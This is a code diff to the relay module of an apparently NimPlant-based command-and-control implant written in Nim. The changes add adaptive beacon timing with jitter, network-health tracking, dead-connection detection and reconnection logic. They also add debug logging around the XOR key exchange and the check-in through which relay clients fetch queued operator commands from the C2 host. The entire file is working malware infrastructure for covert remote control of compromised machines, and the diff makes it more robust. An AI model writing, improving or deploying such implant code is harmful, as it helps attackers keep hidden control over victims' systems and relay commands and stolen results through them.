@@ -4,9 +4,9 @@
     by Alejandro Parodi (@hdbreaker_)
 ]#
 
-import os, random, strutils, times, math, osproc, net, nativesockets, json, sequtils
+import os, random, strutils, times, math, osproc, net, nativesockets, json
 import tables
-import asyncdispatch, asyncnet, asynchttpserver, httpclient
+import asyncdispatch
 import core/webClientListener
 # Import persistence functions
 from core/webClientListener import getStoredImplantID, storeImplantID
@@ -16,8 +16,8 @@ import core/cmdParser
 import core/relay/[relay_protocol, relay_comm, relay_config]
 import modules/relay/relay_commands
 # Import the global relay server from relay_commands to avoid conflicts
-from modules/relay/relay_commands import g_relayServer
-import std/[threadpool, locks]
+from modules/relay/relay_commands import g_relayServer, getConnectionStats, broadcastMessage
+# Removed unused threadpool and locks imports
 
 # Import relay state from relay_commands module - NOW USING SAFE FUNCTIONS
 export isRelayServer, relayServerPort, upstreamRelay, isConnectedToRelay
@@ -66,18 +66,91 @@ var g_relayClientKey: string = ""
 # Speed optimization constants - CLIENT-SIDE CONFIGURATION
 when defined(FAST_MODE):
     const CLIENT_FAST_MODE* = true
-    const RELAY_POLL_INTERVAL = 500     # 0.5 seconds in fast mode
+    const RELAY_POLL_INTERVAL = 1000    # 1 second in fast mode (was 500ms - too aggressive)
     const ERROR_RECOVERY_SLEEP = 1000   # 1 second error recovery in fast mode
     const RECONNECT_DELAY = 2000        # 2 seconds reconnect delay in fast mode
 else:
     const CLIENT_FAST_MODE* = false
-    const RELAY_POLL_INTERVAL = 1000    # 1 second normal mode
+    const RELAY_POLL_INTERVAL = 2000    # 2 seconds normal mode (was 1000ms)
     const ERROR_RECOVERY_SLEEP = 2000   # 2 seconds error recovery normal mode  
     const RECONNECT_DELAY = 3000        # 3 seconds reconnect delay normal mode
 
 # Server-side adaptive timing (adapts to client mode)
 var g_serverFastMode* = false  # Server adapts to client mode dynamically
 var g_adaptiveMaxSleep* = 2000  # Default 2 seconds, adapts to client
+
+# Network Adaptive Throttling System
+type
+    NetworkHealth* = object
+        rtt*: float  # Round-trip time in milliseconds
+        consecutiveErrors*: int
+        lastSuccessTime*: int64
+        isSlowNetwork*: bool
+        adaptiveMultiplier*: float
+
+var g_networkHealth*: NetworkHealth = NetworkHealth(
+    rtt: 50.0,  # Start with 50ms baseline
+    consecutiveErrors: 0,
+    lastSuccessTime: epochTime().int64,
+    isSlowNetwork: false,
+    adaptiveMultiplier: 1.0
+)
+
+# Measure network latency and adjust throttling
+proc updateNetworkHealth*(startTime: float, success: bool) =
+    let currentTime = epochTime()
+    
+    if success:
+        # Calculate RTT and update network health with proper float precision
+        let rtt = (currentTime - startTime) * 1000.0  # Convert to milliseconds
+        
+        # Ensure RTT is reasonable (between 1ms and 60s)
+        let validRtt = max(min(rtt, 60000.0), 1.0)
+        
+        # Exponential moving average for RTT
+        g_networkHealth.rtt = (g_networkHealth.rtt * 0.7) + (validRtt * 0.3)
+        g_networkHealth.consecutiveErrors = 0
+        g_networkHealth.lastSuccessTime = currentTime.int64
+        
+        # Determine if network is slow (RTT > 200ms)
+        g_networkHealth.isSlowNetwork = g_networkHealth.rtt > 200.0
+        
+        # Calculate adaptive multiplier based on network conditions
+        if g_networkHealth.rtt > 500.0:
+            g_networkHealth.adaptiveMultiplier = 4.0  # Very slow network
+        elif g_networkHealth.rtt > 200.0:
+            g_networkHealth.adaptiveMultiplier = 2.0  # Slow network
+        elif g_networkHealth.rtt > 100.0:
+            g_networkHealth.adaptiveMultiplier = 1.5  # Medium network
+        else:
+            g_networkHealth.adaptiveMultiplier = 1.0  # Fast network
+        
+        when defined debug:
+            echo "[DEBUG] 🌐 Network Health Updated - RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & ", Raw RTT: " & $validRtt.int & "ms"
+    else:
+        # Network error - increase consecutive errors and implement exponential backoff
+        g_networkHealth.consecutiveErrors += 1
+        let errorMultiplier = min(pow(2.0, float(g_networkHealth.consecutiveErrors)), 8.0)  # Max 8x backoff
+        g_networkHealth.adaptiveMultiplier = max(g_networkHealth.adaptiveMultiplier, errorMultiplier)
+        
+        when defined debug:
+            echo "[DEBUG] 🚨 Network Error - Consecutive: " & $g_networkHealth.consecutiveErrors & ", Multiplier: " & $g_networkHealth.adaptiveMultiplier
+
+# Get adaptive polling interval based on network conditions
+proc getAdaptivePollingInterval*(): int =
+    let baseInterval = if CLIENT_FAST_MODE: 1000 else: 2000
+    let adaptiveInterval = int(float(baseInterval) * g_networkHealth.adaptiveMultiplier)
+    
+    # Ensure reasonable bounds (min 500ms, max 30s)
+    return min(max(adaptiveInterval, 500), 30000)
+
+# Get adaptive timeout based on network conditions  
+proc getAdaptiveTimeout*(): int =
+    let baseTimeout = if g_networkHealth.isSlowNetwork: 200 else: 100
+    let adaptiveTimeout = int(float(baseTimeout) * g_networkHealth.adaptiveMultiplier)
+    
+    # Ensure reasonable bounds (min 50ms, max 5s)
+    return min(max(adaptiveTimeout, 50), 5000)
 
 # Connect to upstream relay
 proc connectToUpstreamRelay(host: string, port: int): string =
@@ -219,7 +292,7 @@ proc httpHandler() {.async.} =
             when defined debug:
                 echo "[DEBUG] 🌐 HTTP Handler: Checking relay server status - isListening: " & $g_relayServer.isListening
                 echo "[DEBUG] 🌐 HTTP Handler: Relay server port: " & $g_relayServer.port
-                let stats = getConnectionStats(g_relayServer)
+                let stats = relay_commands.getConnectionStats(g_relayServer)
                 echo "[DEBUG] 🌐 HTTP Handler: Relay server connections: " & $stats.connections
             
             if g_relayServer.isListening:
@@ -313,7 +386,7 @@ proc httpHandler() {.async.} =
                                         $responseData
                                     )
                                     
-                                    let stats = getConnectionStats(g_relayServer)
+                                    let stats = relay_commands.getConnectionStats(g_relayServer)
                                     if stats.connections > 0:
                                         discard broadcastMessage(g_relayServer, idMsg)
                                         when defined debug:
@@ -357,6 +430,9 @@ proc httpHandler() {.async.} =
                                 when defined debug:
                                     echo "[DEBUG] 🔑 Decrypted encryption key from relay client PULL request: " & msg.fromID
                                     echo "[DEBUG] 🔑 Key length: " & $relayClientKey.len
+                                    echo "[DEBUG] 🔑 Encrypted key from client: " & encryptedKey[0..min(15, encryptedKey.len-1)] & "..."
+                                    echo "[DEBUG] 🔑 INITIAL_XOR_KEY: " & $INITIAL_XOR_KEY
+                                    echo "[DEBUG] 🔑 Decrypted key preview: " & relayClientKey[0..min(15, relayClientKey.len-1)] & "..."
                                 
                                 # CRITICAL: Use the relay client's encryption key for C2 communication
                                 listener.UNIQUE_XOR_KEY = relayClientKey
@@ -365,6 +441,7 @@ proc httpHandler() {.async.} =
                                     echo "[DEBUG] 🔑 Using relay client encryption key for C2 communication"
                                     echo "[DEBUG] 🔑 Original key length: " & $originalKey.len
                                     echo "[DEBUG] 🔑 Relay client key length: " & $relayClientKey.len
+                                    echo "[DEBUG] 🔑 ✅ Key exchange completed successfully"
                                 
                             except Exception as e:
                                 when defined debug:
@@ -372,6 +449,7 @@ proc httpHandler() {.async.} =
                                     echo "[DEBUG] ⚠️  Error: " & e.msg
                                     echo "[DEBUG] ⚠️  Payload: " & decryptedPayload
                                     echo "[DEBUG] ⚠️  Using relay server's key (will likely fail)"
+                                    echo "[DEBUG] ⚠️  ❌ This will cause CHECK-IN FAILURE!"
                                 # Keep original key if decryption fails
                             
                             # Perform check-in to C2 for relay client using exported function
@@ -380,15 +458,25 @@ proc httpHandler() {.async.} =
                                 echo "[DEBUG] 💓 HTTP Handler: Client ID: " & listener.id
                                 echo "[DEBUG] 💓 HTTP Handler: Using encryption key length: " & $listener.UNIQUE_XOR_KEY.len
                                 echo "[DEBUG] 💓 HTTP Handler: About to call getQueuedCommand() for relay client"
+                                echo "[DEBUG] 💓 HTTP Handler: C2 Host: " & listener.implantCallbackIp & ":" & listener.listenerPort
+                                echo "[DEBUG] 💓 HTTP Handler: Expected to prevent LATE status for: " & listener.id
                                 
+                            let checkInStartTime = epochTime()
                             let (cmdGuid, cmd, args) = webClientListener.getQueuedCommand(listener)
+                            let checkInDuration = (epochTime() - checkInStartTime) * 1000.0  # Convert to ms
                             
                             when defined debug:
-                                echo "[DEBUG] 💓 HTTP Handler: getQueuedCommand() completed"
+                                echo "[DEBUG] 💓 HTTP Handler: getQueuedCommand() completed in " & $checkInDuration.int & "ms"
                                 echo "[DEBUG] 💓 HTTP Handler: Raw response analysis:"
                                 echo "[DEBUG] 💓 HTTP Handler: - Command empty: " & $(cmd == "")
                                 echo "[DEBUG] 💓 HTTP Handler: - Command is connection error: " & $(cmd == obf("NIMPLANT_CONNECTION_ERROR"))
-                                if cmd != "":
+                                if cmd == obf("NIMPLANT_CONNECTION_ERROR"):
+                                    echo "[DEBUG] 💓 HTTP Handler: ❌ CHECK-IN FAILED - C2 CONNECTION ERROR"
+                                    echo "[DEBUG] 💓 HTTP Handler: ❌ Relay client " & msg.fromID & " will be marked as LATE!"
+                                elif cmd == "":
+                                    echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - No commands for " & msg.fromID
+                                else:
+                                    echo "[DEBUG] 💓 HTTP Handler: ✅ CHECK-IN SUCCESSFUL - Got command for " & msg.fromID
                                     echo "[DEBUG] 💓 HTTP Handler: - Command content: '" & cmd & "'"
                                     echo "[DEBUG] 💓 HTTP Handler: - Command length: " & $cmd.len
                                 echo "[DEBUG] 💓 HTTP Handler: - GUID content: '" & cmdGuid & "'"
@@ -427,7 +515,7 @@ proc httpHandler() {.async.} =
                                 )
                                 
                                 # Send command to relay client
-                                let stats = getConnectionStats(g_relayServer)
+                                let stats = relay_commands.getConnectionStats(g_relayServer)
                                 if stats.connections > 0:
                                     discard broadcastMessage(g_relayServer, cmdMsg)
                                     when defined debug:
@@ -447,7 +535,7 @@ proc httpHandler() {.async.} =
                                     "NO_COMMANDS"
                                 )
                                 
-                                let stats = getConnectionStats(g_relayServer)
+                                let stats = relay_commands.getConnectionStats(g_relayServer)
                                 if stats.connections > 0:
                                     discard broadcastMessage(g_relayServer, emptyResponse)
                                     when defined debug:
@@ -541,7 +629,7 @@ proc httpHandler() {.async.} =
                                 "RESULT_SENT_TO_C2"
                             )
                             
-                            let stats = getConnectionStats(g_relayServer)
+                            let stats = relay_commands.getConnectionStats(g_relayServer)
                             if stats.connections > 0:
                                 discard broadcastMessage(g_relayServer, confirmMsg)
                                 when defined debug:
@@ -553,10 +641,6 @@ proc httpHandler() {.async.} =
                         of COMMAND, FORWARD, HTTP_REQUEST, HTTP_RESPONSE:
                             when defined debug:
                                 echo "[DEBUG] 🌐 HTTP Handler: ℹ️  Ignoring relay message type: " & $msg.msgType
-                        
-                        else:
-                            when defined debug:
-                                    echo "[DEBUG] 🌐 HTTP Handler: ℹ️  Ignoring relay message type: " & $msg.msgType
                     
                 except Exception as e:
                     when defined debug:
@@ -601,10 +685,21 @@ proc httpHandler() {.async.} =
                          (if result.len > 200: result[0..199] & "..." else: result)
             
             # 4. Sleep with jitter (like normal implant) - ADAPTIVE FOR RELAY SPEED
-            let sleepMs = if listener.sleepTime > 2:
-                # If sleep time is large, use adaptive timing based on connected clients
+            let connectionStats = relay_commands.getConnectionStats(g_relayServer)
+            let sleepMs = if g_relayServer.isListening and connectionStats.connections > 0:
+                # ADAPTIVE timing when relay clients are connected - adjust based on network health
+                let baseTime = if g_serverFastMode: 500 else: 1000
+                let adaptiveTime = int(float(baseTime) * g_networkHealth.adaptiveMultiplier)
+                # Apply safety bounds: min 200ms, max 15s
+                min(max(adaptiveTime, 200), 15000)
+            elif g_relayServer.isListening and g_serverFastMode:
+                # FORCE fast timing when relay server has fast mode clients
+                g_adaptiveMaxSleep  # 1000ms for fast clients, 2000ms for normal
+            elif listener.sleepTime > 2:
+                # Normal case for high sleep time configs
                 g_adaptiveMaxSleep  # Use adaptive timing based on client mode
             else:
+                # Low sleep time configs use original timing
                 listener.sleepTime * 1000
             
             let jitterMs = if listener.sleepJitter > 0:
@@ -617,6 +712,19 @@ proc httpHandler() {.async.} =
             when defined debug:
                 echo "[DEBUG] 🌐 HTTP Handler: Sleeping for " & $totalSleepMs & "ms (adaptive mode - fast: " & 
                      $g_serverFastMode & ", base: " & $sleepMs & "ms, jitter: " & $jitterMs & "ms)"
+                echo "[DEBUG] 🌐 HTTP Handler: Timing decision analysis:"
+                echo "[DEBUG] 🌐 HTTP Handler: - Relay server listening: " & $g_relayServer.isListening
+                echo "[DEBUG] 🌐 HTTP Handler: - Connected relay clients: " & $connectionStats.connections
+                echo "[DEBUG] 🌐 HTTP Handler: - Server fast mode: " & $g_serverFastMode
+                echo "[DEBUG] 🌐 HTTP Handler: - Adaptive max sleep: " & $g_adaptiveMaxSleep & "ms"
+                echo "[DEBUG] 🌐 HTTP Handler: - Original listener sleep time: " & $listener.sleepTime & "s"
+                echo "[DEBUG] 🌐 Network Throttling Status:"
+                echo "[DEBUG] 🌐 - Network RTT: " & $g_networkHealth.rtt.int & "ms"
+                echo "[DEBUG] 🌐 - Is slow network: " & $g_networkHealth.isSlowNetwork
+                echo "[DEBUG] 🌐 - Adaptive multiplier: " & $g_networkHealth.adaptiveMultiplier
+                echo "[DEBUG] 🌐 - Consecutive errors: " & $g_networkHealth.consecutiveErrors
+                if g_networkHealth.consecutiveErrors > 0:
+                    echo "[DEBUG] 🚨 - Network experiencing issues, using backoff timing"
             
             await sleepAsync(totalSleepMs)
             
@@ -645,6 +753,11 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 echo "[DEBUG] 🔗 Relay Client: Connection status: " & $upstreamRelay.isConnected
             
             let messages = pollUpstreamRelayMessages()  # Uses safe polling with timeout
+            
+            # UPDATE SUCCESS TIME: If we received messages, update last success time
+            if messages.len > 0:
+                g_networkHealth.lastSuccessTime = epochTime().int64
+                g_networkHealth.consecutiveErrors = 0  # Reset errors when we get responses
             
             when defined debug:
                 if messages.len > 0:
@@ -842,6 +955,21 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                     when defined debug:
                         echo "[DEBUG] 🔗 Relay Client: ℹ️  Ignoring message type: " & $msg.msgType
             
+            # DEAD CONNECTION DETECTION: Check if we haven't received any response to our PULL requests
+            let timeSinceLastMessage = epochTime().int64 - g_networkHealth.lastSuccessTime
+            if messages.len == 0 and timeSinceLastMessage > 30:  # No messages for 30+ seconds
+                when defined debug:
+                    echo "[DEBUG] 🚨 ┌─────────── DEAD CONNECTION DETECTED ───────────┐"
+                    echo "[DEBUG] 🚨 │ No responses for " & $timeSinceLastMessage & " seconds │"
+                    echo "[DEBUG] 🚨 │ Assuming connection is dead │"
+                    echo "[DEBUG] 🚨 └─────────────────────────────────────────────────┘"
+                
+                # Force disconnect and reconnect
+                upstreamRelay.isConnected = false
+                # Skip sending PULL this cycle, will reconnect in next iteration
+                await sleepAsync(ERROR_RECOVERY_SLEEP)
+                continue
+            
             # Send PULL message to request commands from relay server
             when defined debug:
                 echo "[DEBUG] 📡 ┌─────────── SENDING PULL REQUEST ───────────┐"
@@ -849,7 +977,11 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 echo "[DEBUG] 📡 │ Client ID: " & g_relayClientID & " │"
                 echo "[DEBUG] 📡 │ Route: [" & g_relayClientID & ", RELAY-SERVER] │"
                 echo "[DEBUG] 🔑 │ Encrypting key with INITIAL_XOR_KEY │"
+                echo "[DEBUG] 🌐 │ Network RTT: " & $g_networkHealth.rtt.int & "ms, Multiplier: " & $g_networkHealth.adaptiveMultiplier & " │"
                 echo "[DEBUG] 📡 └─────────────────────────────────────────────┘"
+            
+            # Record start time for network latency measurement
+            let pullStartTime = epochTime()
             
             # Encrypt the relay client's encryption key for secure transmission
             let encryptedKey = xorString(g_relayClientKey, INITIAL_XOR_KEY)
@@ -866,22 +998,42 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 $pullPayload
             )
             
-            if sendMessage(upstreamRelay, pullMsg):
+            let pullSuccess = sendMessage(upstreamRelay, pullMsg)
+            
+            # CRITICAL: Track if we're receiving responses to detect dead connections
+            if pullSuccess:
+                # Update network health based on PULL success/failure
+                updateNetworkHealth(pullStartTime, pullSuccess)
+                
                 when defined debug:
                     echo "[DEBUG] ✅ ┌─────────── PULL SENT ───────────┐"
                     echo "[DEBUG] ✅ │ PULL request sent successfully │"
                     echo "[DEBUG] ✅ │ Waiting for relay server... │"
                     echo "[DEBUG] ✅ └─────────────────────────────────┘"
+                
             else:
+                # Send failed - connection is definitely dead
+                updateNetworkHealth(pullStartTime, false)
+                
                 when defined debug:
                     echo "[DEBUG] ❌ ┌─────────── PULL FAILED ───────────┐"
                     echo "[DEBUG] ❌ │ Failed to send PULL request │"
-                    echo "[DEBUG] ❌ │ Connection may be lost │"
+                    echo "[DEBUG] ❌ │ Connection is dead │"
                     echo "[DEBUG] ❌ └─────────────────────────────────┘"
+                
+                # Force disconnect
+                upstreamRelay.isConnected = false
             
-            await sleepAsync(RELAY_POLL_INTERVAL) # Optimized relay client polling interval
+            # Use adaptive polling interval based on network conditions
+            let adaptiveInterval = getAdaptivePollingInterval()
             
-            # Check if connection is still alive
+            when defined debug:
+                echo "[DEBUG] 🌐 Adaptive sleep: " & $adaptiveInterval & "ms (base: " & 
+                     (if CLIENT_FAST_MODE: "1000ms" else: "2000ms") & ", RTT: " & $g_networkHealth.rtt.int & "ms)"
+            
+            await sleepAsync(adaptiveInterval)
+            
+            # Check if connection is still alive and handle stuck connections
             if not upstreamRelay.isConnected:
                 when defined debug:
                     echo "[DEBUG] Connection lost, attempting to reconnect..."
@@ -889,7 +1041,26 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 let reconnectResult = connectToUpstreamRelay(host, port)
                 when defined debug:
                     echo "[DEBUG] Reconnection result: " & reconnectResult
-                    
+            
+            # ANTI-STUCK PROTECTION: Detect if network is unhealthy and force reconnection
+            elif g_networkHealth.consecutiveErrors > 3:
+                when defined debug:
+                    echo "[DEBUG] 🚨 Network is unhealthy (errors: " & $g_networkHealth.consecutiveErrors & "), forcing reconnection..."
+                
+                # Close current connection
+                if upstreamRelay.isConnected:
+                    upstreamRelay.isConnected = false
+                
+                # Wait and reconnect
+                await sleepAsync(RECONNECT_DELAY * 2) # Longer delay for problematic networks
+                let reconnectResult = connectToUpstreamRelay(host, port)
+                when defined debug:
+                    echo "[DEBUG] Force reconnection result: " & reconnectResult
+                
+                # Reset network health after reconnection attempt
+                g_networkHealth.consecutiveErrors = 0
+                g_networkHealth.adaptiveMultiplier = 1.0
+            
         except Exception as e:
             when defined debug:
                 echo "[DEBUG] Relay client error: " & e.msg
